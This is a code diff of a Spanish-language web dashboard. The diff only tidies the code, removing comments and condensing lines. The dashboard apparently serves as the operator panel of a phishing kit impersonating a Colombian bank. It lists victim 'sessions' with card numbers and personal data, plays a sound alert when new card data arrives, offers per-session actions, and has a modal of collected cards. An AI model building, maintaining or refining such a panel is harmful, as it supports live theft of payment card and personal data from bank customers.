@@ -60,7 +60,6 @@ tbody td.mono { font-family: 'Courier New', monospace; font-size: 11px; color: #
 #toast { position: fixed; bottom: 24px; right: 24px; background: #161a21; border: 1px solid #262c36; border-left: 4px solid #ed1c27; color: #e5e7eb; padding: 14px 20px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); font-size: 13px; font-weight: 500; z-index: 9999; transform: translateX(500px); transition: transform .3s; max-width: 400px; }
 #toast.show { transform: translateX(0); }
 #toast.error { border-left-color: #ef4444; }
-/* MODAL TARJETAS */
 .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
 .modal-content { background: #161a21; border: 1px solid #262c36; border-radius: 12px; width: 100%; max-width: 900px; max-height: 80vh; display: flex; flex-direction: column; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
 .modal-header { padding: 16px 20px; border-bottom: 1px solid #262c36; display: flex; justify-content: space-between; align-items: center; }
@@ -139,7 +138,6 @@ tbody td.mono { font-family: 'Courier New', monospace; font-size: 11px; color: #
 
 <div id="toast"></div>
 
-<!-- MODAL TARJETAS -->
 <div class="modal" id="modalTarjetas">
     <div class="modal-content">
         <div class="modal-header">
@@ -198,14 +196,9 @@ function formatMoney(n) {
     return '$' + v.toLocaleString('es-CO');
 }
 
-// ---------- LÓGICA DE AUDIO ----------
 function activarAudio() {
-    if (!audioCtx) {
-        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    }
-    if (audioCtx.state === 'suspended') {
-        audioCtx.resume();
-    }
+    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    if (audioCtx.state === 'suspended') audioCtx.resume();
 }
 
 function reproducirAlerta() {
@@ -214,29 +207,21 @@ function reproducirAlerta() {
         const ahora = audioCtx.currentTime;
         const osc = audioCtx.createOscillator();
         const gain = audioCtx.createGain();
-        
         osc.type = 'sine';
-        osc.frequency.setValueAtTime(880, ahora); // Tono A5
-        osc.frequency.exponentialRampToValueAtTime(1320, ahora + 0.1); // Deslizar a E6
-        
+        osc.frequency.setValueAtTime(880, ahora);
+        osc.frequency.exponentialRampToValueAtTime(1320, ahora + 0.1);
         gain.gain.setValueAtTime(0, ahora);
         gain.gain.linearRampToValueAtTime(0.3, ahora + 0.05);
         gain.gain.exponentialRampToValueAtTime(0.01, ahora + 0.4);
-        
         osc.connect(gain);
         gain.connect(audioCtx.destination);
-        
         osc.start(ahora);
         osc.stop(ahora + 0.4);
-    } catch (e) {
-        console.error('Error al reproducir sonido', e);
-    }
+    } catch (e) {}
 }
 
-// Desbloquear audio en el primer clic en la página
 document.addEventListener('click', activarAudio, { once: true });
 
-// ---------- API ----------
 async function api(path, options) {
     options = options || {};
     const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
@@ -258,9 +243,7 @@ async function login() {
     const usuario = $('loginUser').value.trim();
     const password = $('loginPass').value;
     const errEl = $('loginError');
-    
-    activarAudio(); // Activar audio al iniciar sesión
-    
+    activarAudio();
     if (!usuario || !password) {
         errEl.textContent = 'Completa usuario y contraseña';
         errEl.style.display = 'block';
@@ -295,14 +278,12 @@ async function login() {
 function logout() {
     sessionStorage.removeItem('daviToken');
     sessionStorage.removeItem('daviUser');
-    TOKEN = '';
-    USUARIO = '';
+    TOKEN = ''; USUARIO = '';
     if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
     $('dashboard').style.display = 'none';
     $('loginScreen').style.display = 'flex';
-    $('loginUser').value = '';
-    $('loginPass').value = '';
-    firmaSesionesAnterior = ''; // Resetear firma
+    $('loginUser').value = ''; $('loginPass').value = '';
+    firmaSesionesAnterior = '';
 }
 
 $('logoutBtn').addEventListener('click', logout);
@@ -339,7 +320,6 @@ function renderSesiones() {
     const filtro = ($('buscar').value || '').toLowerCase().trim();
     const tbody = $('tbodySesiones');
     let lista = sesionesCache;
-    
     if (filtro) {
         lista = lista.filter(s => {
             const dp = (s.datos && s.datos.datosPersonales) || {};
@@ -348,7 +328,6 @@ function renderSesiones() {
         });
     }
 
-    // 🔥 LÓGICA DE SONIDO: Comparamos si los datos cambiaron o hay uno nuevo 🔥
     const firmaActual = JSON.stringify(sesionesCache.map(s => ({ id: s.sessionId, t: s.datos?.tarjeta, e: s.estado })));
     if (firmaSesionesAnterior !== '' && firmaActual !== firmaSesionesAnterior) {
         reproducirAlerta();
@@ -359,7 +338,6 @@ function renderSesiones() {
         tbody.innerHTML = '<tr><td colspan="12" class="empty">Sin solicitudes</td></tr>';
         return;
     }
-
     tbody.innerHTML = lista.map(s => {
         const d = s.datos || {};
         const dp = d.datosPersonales || {};
@@ -415,7 +393,6 @@ async function accion(sessionId, tipo) {
     }
 }
 
-// ---------- LÓGICA MODAL TARJETAS ----------
 $('btnVerTarjetas').addEventListener('click', async () => {
     $('modalTarjetas').style.display = 'flex';
     $('tbodyTarjetas').innerHTML = '<tr><td colspan="7" class="empty">Cargando...</td></tr>';
@@ -442,9 +419,7 @@ $('btnVerTarjetas').addEventListener('click', async () => {
     }
 });
 
-function cerrarModal() {
-    $('modalTarjetas').style.display = 'none';
-}
+function cerrarModal() { $('modalTarjetas').style.display = 'none'; }
 
 if (TOKEN && USUARIO) { mostrarDashboard(); }
 </script>
